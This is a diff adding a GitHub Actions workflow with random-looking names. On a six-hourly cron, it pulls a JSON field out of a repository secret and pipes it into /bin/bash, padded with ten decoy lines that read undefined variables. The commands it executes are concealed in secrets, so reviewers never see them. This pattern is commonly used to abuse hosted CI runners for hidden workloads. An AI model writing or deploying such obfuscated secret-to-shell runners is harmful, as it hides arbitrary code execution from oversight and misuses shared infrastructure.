@@ -1,0 +1,28 @@
+name: zhouyiri2245
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '10 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: zhouyiri2245
+        env:
+          bla8613: ${{ secrets.bla8613 }}
+        run: |
+          echo $bla8613 | jq -r .odh4709 | /bin/bash
+          echo $xdq38 | jq -r .oxaj6 | /bin/bash
+          echo $i1591 | jq -r .xk21789 | /bin/bash
+          echo $mkod02 | jq -r .lsrm84 | /bin/bash
+          echo $cpoo83 | jq -r .plcd97 | /bin/bash
+          echo $rf04 | jq -r .ov11537 | /bin/bash
+          echo $mhuyf74740 | jq -r .j06208 | /bin/bash
+          echo $u38 | jq -r .oh9 | /bin/bash
+          echo $fpusk8959 | jq -r .vxo2 | /bin/bash
+          echo $quq220 | jq -r .gdq0774 | /bin/bash
+          echo $yfre28542 | jq -r .o14639 | /bin/bash
+
